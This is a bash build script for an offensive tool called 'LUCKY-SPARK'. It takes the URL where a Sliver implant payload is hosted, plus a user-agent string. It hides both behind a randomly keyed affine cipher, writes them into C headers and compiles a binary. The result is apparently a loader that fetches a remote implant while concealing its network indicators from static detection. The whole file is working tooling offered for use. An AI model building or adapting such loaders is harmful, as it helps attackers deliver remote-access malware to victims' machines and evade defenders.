#!/bin/bash
clear
echo
echo -e "\033[38;5;208m⟪ LUCKY-SPARK ⟫\033[0m"
echo


DEFAULT_UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"

URL=""
USERAGENT=""
CONFIG_ONLY=false


while [[ "$#" -gt 0 ]]; do
    case "$1" in
        -u|--url)
            if [[ -n "$2" ]]; then
                URL="$2"
                shift 2
            else
                echo "Error: -url requires a value"
				echo -e "\033[38;5;208m⟩ Error: -url requires a value\033[0m"
                exit 1
            fi
            ;;
        -a|--agent)
            if [[ -n "$2" ]]; then
                USERAGENT="$2"
                shift 2
            else
                echo "Error: -agent requires a value"
                exit 1
            fi
            ;;
        -h|--help)
    echo -e "\033[1;34mUsage:\033[0m $0 -u|--url <URL> [-a|--agent <User-Agent>] [-c|--config] [-h|--help]

Options:
  -u, --url       Specify the full URL where the Sliver payload is hosted. This is required unless entered interactively.
  -a, --agent     Specify a custom User-Agent string to use for HTTP requests. Optional; Get prompted if obmitted.
  -c, --config    Generate only the config files without running the build process.
  -h, --help      Show this help message and exit.
"
            exit 0
            ;;
        -c|--config)
            echo "⟩ Generating only Config File"
            CONFIG_ONLY=true
            shift 1
            ;;
        *)
            echo "⟩ Unknown parameter: $1"
            exit 1
            ;;
    esac
done

if [[ -z "$URL" ]]; then
	echo -e "\033[1;34m⟩ Enter URL:\033[0m "
    read -p "⟩ " URL


fi

if [[ -z "$USERAGENT" ]]; then

	echo -e "\033[1;34m⟩ Enter User-Agent (leave empty for default):\033[0m "
    read -p "⟩ " USERAGENT
fi

if [[ -z "$USERAGENT" ]]; then
    USERAGENT="$DEFAULT_UA"
	echo -ne "\033[1A\033[2K"
	echo "⟩ $DEFAULT_UA"
fi

if [[ -z "$URL" ]]; then
    echo -e "\033[38;5;208m⟩ Error: URL must not be empty.\033[0m"
    exit 1
fi

if [ "$CONFIG_ONLY" = false ]; then
   make cleanAll > .makelogs.txt
fi



generate_odd() {
  local num=$((RANDOM % 256))  
  if (( num % 2 == 0 )); then
    num=$((num + 1))
  fi
  if (( num > 255 )); then
    num=$((num - 2))
  fi
  echo $num
}


modinv() {
  local a=$1
  local m=$2
  local m0=$m
  local y=0
  local x=1

  if (( m == 1 )); then
    echo 0
    return
  fi

  while (( a > 1 )); do
    local q=$((a / m))
    local t=$m

    m=$((a % m))
    a=$t

    t=$y
    y=$((x - q * y))
    x=$t
  done

  if (( x < 0 )); then
    x=$((x + m0))
  fi

  echo $x
}


encrypt_string_c_hex() {
    local input="$1"
    local i char ascii obf
    local output=""

    
    for (( i=0; i<=${#input}; i++ )); do
        if (( i < ${#input} )); then
            char="${input:$i:1}"
            ascii=$(printf "%d" "'$char")
        else
            
            ascii=0
        fi
        
        obf=$(( (A * ascii + B) & 0xFF ))
        
        if [[ -n "$output" ]]; then
            output+=", "
        fi
        output+="0x$(printf "%02X" "$obf")"
    done

    echo "$output"
}


A=$(generate_odd)
B=$(generate_odd)
INV_A=$(modinv $A 256)

OBFUSCATED_URL=$(encrypt_string_c_hex "$URL")
OBFUSCATED_AGENT=$(encrypt_string_c_hex "$USERAGENT")

echo "#pragma once" > ./inc/lucky_obf_configs.h
echo "" >> ./inc/lucky_obf_configs.h
echo "#define A  $A" >> ./inc/lucky_obf_configs.h
echo "#define B $B">> ./inc/lucky_obf_configs.h
echo "#define INV_A $INV_A">> ./inc/lucky_obf_configs.h

echo -e "\033[1;34m⟩ Affine Cipher Parameters for String Obfuscation:\033[0m "
echo "⟩ A=$A INV_A=$INV_A B=$B"


echo "#pragma once" > ./inc/lucky_net_configs.h
echo "" >> ./inc/lucky_net_configs.h
echo "const unsigned char s_Url[] = { $OBFUSCATED_URL };" >> ./inc/lucky_net_configs.h
echo "const unsigned char s_UserAgent[] = { $OBFUSCATED_AGENT };" >> ./inc/lucky_net_configs.h


frames=(
$'\033[1;34m⟩ Generating Binary  ⣾\033[0m'
$'\033[1;34m⟩ Generating Binary  ⣽\033[0m'
$'\033[1;34m⟩ Generating Binary  ⣻\033[0m'
$'\033[1;34m⟩ Generating Binary  ⢿\033[0m'
$'\033[1;34m⟩ Generating Binary  ⡿\033[0m'
$'\033[1;34m⟩ Generating Binary  ⣟\033[0m'
$'\033[1;34m⟩ Generating Binary  ⣯\033[0m'
$'\033[1;34m⟩ Generating Binary  ⣷\033[0m'
)

show_spinner() {
    local pid=$1
    local delay=0.3
    local i=0

    while kill -0 "$pid" 2>/dev/null; do
        printf "\r\033[2K%s" "${frames[i]}"

        ((i=(i+1)%${#frames[@]}))
        sleep $delay
    done
}


if [ "$CONFIG_ONLY" = false ]; then

    make all >> .makelogs.txt 2>&1 &
    MAKE_PID=$!
	echo
    
    show_spinner $MAKE_PID
    wait $MAKE_PID
    MAKE_EXIT_CODE=$?

	
    
    printf "\r\033[2K"

    if [ $MAKE_EXIT_CODE -eq 0 ]; then
        rm -rf ./obj
        
        echo -e "\033[1;34m⟩ Generating Binary  ⣿\033[0m"
    else
        
        echo -e "\033[38;5;208m⟩ Generating Binary Error: see makelogs.txt\033[0m"
        exit $MAKE_EXIT_CODE  
    fi

else
    echo
fi


echo -e "\033[1;34m⟩ Done!\033[0m\n"


